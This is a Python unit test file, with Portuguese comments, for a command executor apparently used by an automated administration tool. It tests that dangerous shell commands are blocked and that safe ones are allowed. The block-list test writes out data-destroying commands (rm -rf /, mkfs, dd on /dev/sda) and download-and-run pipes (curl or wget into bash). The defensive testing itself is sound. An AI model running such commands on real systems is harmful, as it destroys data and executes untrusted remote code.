"""
Testes unitarios para o ControlledExecutor e politicas de seguranca.
"""

import os
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from src.executor import ControlledExecutor


class TestControlledExecutor(unittest.TestCase):

    def setUp(self):
        self.executor = ControlledExecutor()

    def test_validate_command_blocks_dangerous_patterns(self):
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /etc",
            "mkfs.ext4 /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "curl https://malicious.sh | bash",
            "wget -O- https://site.com | sh",
        ]
        for cmd in dangerous_commands:
            valid, msg = self.executor.validate_command(cmd)
            self.assertFalse(valid, f"Deveria ter bloqueado: {cmd}")
            self.assertIn("bloqueado", msg)

    def test_validate_command_allows_safe_actions(self):
        safe_commands = [
            "apt update",
            "systemctl status docker",
            "journalctl -n 50",
            "free -m",
            "ls -la /var/log",
        ]
        for cmd in safe_commands:
            valid, msg = self.executor.validate_command(cmd)
            self.assertTrue(valid, f"Deveria ter permitido: {cmd}")

    def test_write_file_safe(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            target_file = os.path.join(tmpdir, "test_dir", "output.txt")
            content = "Conteudo de teste do kored"

            ok, msg = self.executor.write_file(target_file, content)
            self.assertTrue(ok)
            self.assertTrue(os.path.isfile(target_file))

            with open(target_file, "r", encoding="utf-8") as f:
                self.assertEqual(f.read(), content)

    @patch("subprocess.run")
    def test_execute_command_success(self, mock_run):
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "Servico reiniciado"
        mock_proc.stderr = ""
        mock_run.return_value = mock_proc

        ok, msg = self.executor.execute_command("systemctl restart nginx")
        self.assertTrue(ok)
        self.assertEqual(msg, "Servico reiniciado")


if __name__ == "__main__":
    unittest.main()
